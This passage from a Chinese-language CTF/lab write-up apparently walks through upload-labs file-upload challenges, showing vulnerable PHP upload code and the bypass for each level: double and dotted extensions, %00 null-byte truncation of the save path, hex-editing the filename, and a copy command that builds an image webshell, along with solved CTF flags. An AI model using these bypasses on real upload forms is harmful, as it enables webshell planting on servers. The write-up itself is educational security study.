class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看起来是该过滤的都过滤掉了，但是也只过滤了一次，抓包写后缀<strong>php.
.</strong>就可以了。</p>
<h4 id="pass-10">Pass-10</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>)) &#123;</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后缀由于只删除一次，所以只要抓包后写<strong>pphphp</strong>后缀就好了。</p>
<h5 id="原理-2">原理</h5>
<p><strong>str_ireplace(find,replace,string,count)</strong>该函数对大小写不敏感。</p>
<p>同时对大小写敏感的是，<strong>str_replace(find,replace,string,count)</strong>。</p>
<p>作用是将<strong>string</strong>中的<strong>find</strong>替换成<strong>relpace</strong>，<strong>count</strong>计数替换了几次。</p>
<p>如果<strong>find</strong>和<strong>replace</strong>都是数组的话，<strong>replace</strong>若多于<strong>find</strong>，则多余部分无视，若少，则空串替换。</p>
<h4 id="pass-11">Pass-11</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Get</strong>请求，在保存路径处修改为<strong>save_path=../upload/filename.php%00</strong>上传可以绕过。</p>
<h5 id="例题"><a
href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php">例题</a></h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (@<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[1-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;必须输入数字才行&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>], <span class="string">&#x27;#biubiubiu&#x27;</span>) !== <span class="literal">FALSE</span>)   </span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;骚年，继续努力吧啊~&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ereg()</strong>函数是寻找匹配字符。即第二行需要<strong>Get</strong>一个数字。</p>
<p><strong>strpos()</strong>函数会返回查找的字符串的位置。即在第四行的作用是匹配<strong>#biubiubiu</strong>就行了。</p>
<p>并且这儿<strong>ereg()</strong>函数有两个漏洞，一是有<strong>%00</strong>截断是认为字符串结束；二是<strong>Get</strong>到数组的时候返回值不是<strong>FALSE</strong>。</p>
<p>那么构造<strong>?nctf=1%00%23biubiubiu</strong>呢，一是<strong>ereg()</strong>函数接收到<strong>%00</strong>后就截断了，因此只收了<strong>1</strong>。而后面的<strong>strpos</strong>会完整的接收，因此有返回值。</p>
<p>第二个构造的<strong>?nctf[]=1</strong>这个一是<strong>ereg</strong>函数接收数组匹配不会返回<strong>FALSE</strong>【具体是什么我也没测试<strong>XD</strong>。二是<strong>strpos</strong>函数未匹配到字符串会返回<strong>0</strong>，而第四行处<strong>0!==FALSE</strong>是<strong>TRUE</strong>，因此得以绕过，得到<strong>flag</strong>，<strong>nctf{use_00_to_jieduan}</strong>。</p>
<h5 id="原理-3">原理</h5>
<p><strong>%00</strong>截断的条件：</p>
<ol type="1">
<li>php版本小于<strong>5.3.4</strong>
，详情关注<strong>CVE-2006-7243</strong>。</li>
<li>php的<strong>magic_quotes_gpc</strong>为<strong>OFF</strong>状态。</li>
</ol>
<p><strong>%00</strong>截断有这么两种利用状况</p>
<ol type="1">
<li>在url中加入<strong>%00</strong>，如<strong>http://xxxx/filename.php%00.jpg</strong>。</li>
<li>在<strong>Burpsuite</strong>的<strong>16</strong>进制编辑工具将<strong>filename.php
.jpg</strong>中间的空格由<strong>20</strong>改成<strong>00</strong></li>
</ol>
<p><strong>Url</strong>中的<strong>%00</strong>【只要是这种<strong>%xx</strong>的形式，<strong>Webserver</strong>会把它当作十六进制处理，然后把<strong>16</strong>进制的<strong>hex</strong>自动翻译成<strong>Ascii</strong>码值<strong>null</strong>，实现了截断<strong>Burpsuite</strong>中<strong>16</strong>进制编辑器将空格<strong>20</strong>改成了<strong>00</strong>，跟上面一样的变成<strong>Ascii</strong>的<strong>null</strong>。</p>
<h4 id="pass-12">Pass-12</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Post</strong>请求。与<strong>Get</strong>请求不同的是它需要在<strong>Hex</strong>中<strong>save_path=../upload/filename.php</strong>后修改<strong>0x00</strong>截断才能产生空字符。</p>
<h5 id="例题-1"><a
href="http://ctf5.shiyanbar.com/web/upload/">例题</a></h5>
<p>修改<strong>/uploads/1.php
.jpg</strong>然后转到<strong>Hex</strong>。</p>
<p>很容易就看到Hex中对应的那一串<strong>/uploads/1.php
.jpg</strong>。</p>
<p><strong>20</strong>是空格，在<strong>php</strong>和<strong>jpg</strong>中间，把它改成<strong>00</strong>就行了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">恭喜你获得flag一枚：</span><br><span class="line">flag&#123;SimCTF_huachuan&#125;</span><br></pre></td></tr></table></figure>
<h5 id="例题-2"><a
href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/upload.php">例题</a></h5>
<p>传<strong>php</strong>的结果是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; .php [1] =&gt; php ) 不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件</span><br></pre></td></tr></table></figure>
<p>传<strong>jpg</strong>的结果是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; .jpg [1] =&gt; jpg ) Upload: 1.jpg</span><br><span class="line">Type: image/jpeg</span><br><span class="line">Size: 36.2470703125 Kb</span><br><span class="line">Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) &#123; [&quot;dirname&quot;]=&gt; string(9) &quot;./uploads&quot; [&quot;basename&quot;]=&gt; string(5) &quot;1.jpg&quot; [&quot;extension&quot;]=&gt; string(3) &quot;jpg&quot; [&quot;filename&quot;]=&gt; string(1) &quot;1&quot; &#125; </span><br><span class="line">必须上传成后缀名为php的文件才行啊！</span><br></pre></td></tr></table></figure>
<p>猜测是<strong>00</strong>截断了，解法同上面实验吧。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">恭喜你获得flag一枚：</span><br><span class="line">flag:nctf&#123;welcome_to_hacks_world&#125;</span><br></pre></td></tr></table></figure>
<h4 id="pass-12-1">Pass-12</h4>
<p>同Pass-11。清除缓存得到了正确结果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/1.php□.jpg/7420180731234236.jpg&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure>
<h4 id="pass-13">Pass-13</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>做一个图片马传上去就行了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy 1.jpg /b + 1.php /a shell.jpg</span><br></pre></td></tr></table></figure>
<p>看了半天才发现需要配合文件包含漏洞才能继续下去。而此处没有。</p>
<h4 id="pass-14">Pass-14</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同<strong>Pass-13</strong>传图片马。</p>
<h5 id="原理-4">原理</h5>
<p>此处使用的<strong>getimagesize()</strong>函数用来判断文件类型。主要方式是检测文件头。</p>
<h4 id="pass-15">Pass-15</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题解是传图片马。</p>
<h5 id="原理-5">原理</h5>
<p><strong>exif_imagetype()</strong>函数检测文件头判断文件类型，感觉和<strong>Pass-14</strong>没差啊<strong>Orz</strong>。</p>
<h4 id="pass-16">Pass-16</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span 